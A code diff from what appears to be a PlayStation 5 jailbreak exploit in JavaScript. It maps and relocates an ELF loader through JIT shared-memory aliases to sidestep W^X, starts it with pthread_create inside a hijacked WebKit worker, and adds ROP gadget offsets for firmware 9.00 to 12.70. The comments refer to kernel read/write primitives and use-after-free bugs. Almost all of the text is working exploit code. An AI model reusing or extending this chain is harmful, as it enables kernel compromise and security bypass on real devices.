+            if (pt === 1) { loads.push({ poff, pva, pfsz, pmsz, pflags }); if (pva + pmsz > maxva) maxva = pva + pmsz; }
             else if (pt === 2) dynva = pva;
         }
         const v2o = (va) => {                       // image vaddr -> file offset
@@ -2846,15 +3626,59 @@ function run() {
             throw new Error("elfldr: vaddr 0x" + va.toString(16) + " not in a LOAD seg");
         };
 
-        // one contiguous RWX region for the whole image, from a fresh mmap (the
-        // worker-stack arena is too small - see mmapRWX). Returns RWX already.
+        /* Map the image the way umtx2 does: the executable segment gets a
+         * jitshm exec mapping plus a writable alias of the same pages, and the
+         * data segments get ordinary anonymous RW memory. Everything is
+         * MAP_FIXED at a chosen base so segment vaddrs keep their relative
+         * layout — which is required, because the relocations and all the
+         * image's internal references assume it.
+         *
+         * The important consequence: elfldr's text is never writable and its
+         * data is never executable, so no page violates W^X and no kernel
+         * protection bits are patched for the image at all. Writes to text
+         * (segment copy and relocations landing in it) are redirected through
+         * the alias.
+         *
+         * elfldr's own LOAD0 is flagged RWX (0x7) rather than RX, so key the
+         * exec/data split on PF_X rather than on an exact flag match. */
+        const PF_X = 1;
         const span = (maxva + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-        const base = mmapRWX(span);
-        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16));
+        const IMAGE_BASE  = 0x0000000926100000n;   // fixed, as umtx2 does
+        const SHADOW_BASE = 0x0000000920100000n;   // writable alias of the text
 
-        // copy LOAD segments to base+vaddr, zero the bss tail
+        let textEnd = 0, shadow = 0n;
         for (const s of loads) {
-            const dst = base + BigInt(s.pva);
+            const alen = (s.pmsz + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
+            if (s.pflags & PF_X) {
+                const pair = jitshmPair(IMAGE_BASE + BigInt(s.pva), SHADOW_BASE, alen);
+                shadow = pair.write;
+                textEnd = s.pva + s.pmsz;
+            } else {
+                // fd as an explicit unsigned 64-bit -1: wr64at BigInt()s the
+                // value straight into memory, and a negative BigInt there is
+                // not what the stub's `mov r8, [rbx+0x20]` should read.
+                const got = nativeMmap(IMAGE_BASE + BigInt(s.pva), alen,
+                                       PROT_RW, MAP_ANON_PRIV_FIXED,
+                                       0xFFFFFFFFFFFFFFFFn, 0);
+                if (got === 0xFFFFFFFFFFFFFFFFn)
+                    throw new Error("elfldr: data mmap failed at vaddr 0x"
+                                    + s.pva.toString(16));
+            }
+        }
+        const base = IMAGE_BASE;
+        if (!shadow) throw new Error("elfldr: no executable LOAD segment found");
+        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16)
+               + " shadow=" + hex(shadow) + " textEnd=0x" + textEnd.toString(16));
+
+        /* Where a write for image offset `va` must actually go: inside the text
+         * segment it has to go through the writable alias, because the exec
+         * mapping is not writable. */
+        const wdst = (va) => (va < textEnd) ? shadow + BigInt(va)
+                                            : base + BigInt(va);
+
+        // copy LOAD segments, zero the bss tail
+        for (const s of loads) {
+            const dst = wdst(s.pva);
             writeBytes(dst, buf, s.poff, s.pfsz);
             for (let j = s.pfsz; j < s.pmsz; j++) R.wr8(dst, j, 0);
         }
@@ -2874,13 +3698,18 @@ function run() {
             const ro = v2o(relaOff + i * relaEnt);
             const r_offset = u64(ro), r_info = u64(ro + 8), r_addend = u64(ro + 16);
             if (Number(r_info & 0xffffffffn) === R_X86_64_RELATIVE) {
-                R.wr64(base + r_offset, base + r_addend);
+                /* The VALUE is always relative to the real image base, but the
+                 * WRITE has to go through the alias when the target lands in
+                 * the text segment — that mapping is execute-only-ish (RX) and
+                 * a direct store would fault. */
+                R.wr64(wdst(Number(r_offset)), base + r_addend);
                 nrel++;
             }
         }
         beacon("elfldr relocs applied=" + nrel);
 
-        // (image region is already RWX - mmapRWX returned it executable)
+        // No protection fixup needed: the exec mapping was created executable
+        // by jitshm and never had to be forced.
 
         // native dlsym stub: mov r10,rcx; mov eax,0x24F; syscall; ret
         const stub = mem.alloc(0x20);
@@ -2904,25 +3733,36 @@ function run() {
         wr64at(args, 0x20, kdataBase);
         wr64at(args, 0x28, BigInt(payloadout));
 
-        // spawn elfldr on its own thread: thr_new sets %fs from tls_base, so the
-        // new thread has valid TLS (canary/errno) with no manual setup.
-        const estack = mem.alloc(0x20000);
-        const tls = mem.alloc(0x4000);
-        R.wr64(BigInt(tls), BigInt(tls));         // minimal TCB self-pointer
-        const tid = mem.alloc(0x18);
-        const param = mem.alloc(THR_PARAM_SIZE);
-        mem.bset(param, THR_PARAM_SIZE, 0);
-        wr64at(param, 0x00, base + BigInt(e_entry));      // start_func = entry
-        wr64at(param, 0x08, BigInt(args));                // arg -> rdi
-        wr64at(param, 0x10, BigInt(estack));              // stack_base
-        wr64at(param, 0x18, BigInt(0x20000));             // stack_size
-        wr64at(param, 0x20, BigInt(tls));                 // tls_base -> %fs
-        wr64at(param, 0x28, BigInt(0x4000));              // tls_size
-        wr64at(param, 0x30, BigInt(tid));                 // child_tid
-        wr64at(param, 0x38, BigInt(tid));                 // parent_tid
-        const trv = invoke("thr_new", BigInt(param), S(THR_PARAM_SIZE));
-        beacon("elfldr thr_new -> " + trv + " entry=" + hex(base + BigInt(e_entry)));
-        if (trv !== 0) throw new Error("elfldr: thr_new returned " + trv);
+        /* Spawn elfldr with libkernel's pthread_create, not raw thr_new.
+         *
+         * thr_new makes the CALLER build the thread: stack, and critically a
+         * TCB for %fs. What we handed it was a single self-pointer, which is
+         * not a TCB — no stack-guard canary, no errno slot, no dtv. Any libc
+         * call inside elfldr that reads %fs (and a stack-protected function
+         * reads the canary on entry) is then reading whatever follows that one
+         * qword. It may survive; it is not a thread.
+         *
+         * pthread_create(&tid, attr=NULL, entry, arg) does all of that properly
+         * and is four arguments, which our chain reaches — it is only mmap's
+         * sixth argument that is out of reach. umtx2 uses the same approach
+         * (pthread_create_name_np, the 5-arg named variant).
+         *
+         * Deliberately NOT joined. umtx2 can pthread_join because it drives ROP
+         * from a chain it owns; ours runs on a hijacked WebKit worker parked in
+         * cond_wait, and elfldr does not return while it is serving port 9021.
+         * Joining would block that worker inside the kernel forever, which is
+         * precisely the wedge state the run refuses to recover from. Poll
+         * payloadout from the main thread instead — same information, no risk
+         * to the worker. */
+        const pthreadCreate = libkernelFn("pthread_create");
+        const tid = mem.alloc(8);
+        R.wr64(BigInt(tid), 0n);
+        const entry = base + BigInt(e_entry);
+        const prv = Number(window.rop_worker.callSync(
+            pthreadCreate, BigInt(tid), 0n, entry, BigInt(args)).retval) | 0;
+        beacon("elfldr pthread_create -> " + prv + " entry=" + hex(entry)
+               + " tid=" + hex(R.rd64(BigInt(tid))));
+        if (prv !== 0) throw new Error("elfldr: pthread_create returned " + prv);
 
         // elfldr writes its result into payloadout on exit
         let out = 0n;
@@ -2952,8 +3792,36 @@ function run() {
  * 0x32a57 disassembles to `mov qword ptr [rdi], rax ; ret` in the devkit's own
  * libSceNKWebKit, so it is used here for 10.00 only. Other firmwares must be
  * verified the same way before being added.
+ *
+ * They now have been. Every firmware below carries a mov_qword_rdi_rax that was
+ * disassembled out of that firmware's own retail libSceNKWebKit.sprx and
+ * string-matched against `mov qword ptr [rdi], rax ; ret` - the same standard
+ * 0x32A57 was held to, applied to all fourteen. Note this table exists BECAUSE
+ * store() needs the gadget and GADGETS does not carry it: before this, every
+ * firmware except 10.00 would build a chain with `undefined` for the store
+ * gadget, so leaving the other thirteen blank was not a neutral default.
  */
-const EXTRA_GADGETS = { "10.00": { mov_qword_rdi_rax: 0x32A57n } };
+const EXTRA_GADGETS = {
+    "09.00": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0C9n },
+    "09.20": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "09.40": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "09.60": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
+    "10.00": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.01": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.20": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.40": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "10.60": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
+    "11.00": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.20": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.40": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "11.60": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
+    "12.00": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.02": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.20": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.40": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.60": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+    "12.70": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
+};
 
 function gadgetsFor(fw) {
     const t = GADGETS[fw];
@@ -2969,8 +3837,14 @@ function gadgetsFor(fw) {
     return out;
 }
 
+/* find_allproc / make_karw / isKernelPtr are exported for lapse-ps5.js.
+ * lapse reaches kernel R/W by a completely different route (aio double free ->
+ * pktopts twins), but once it has a pipe pair and a forged pipebuf the pipe
+ * primitive and everything above it — allproc, the jailbreak, elfldr — is the
+ * same code, so it hands off here rather than duplicating it. */
 window.netctrl_ps5 = { run, ST, KRW, sys, find_twins, find_triplet,
                        ucred_triple_free, leak_kqueue, ps5_jailbreak,
+                       find_allproc, isKernelPtr, mem, invoke,
                        runtimeStatus, bindRuntime, gadgetsFor,
                        SYSCALL_NUMS, version: "netctrl-ps5 1.0" };
 log("loaded — netctrl_ps5.runtimeStatus() to check, .run() to go");
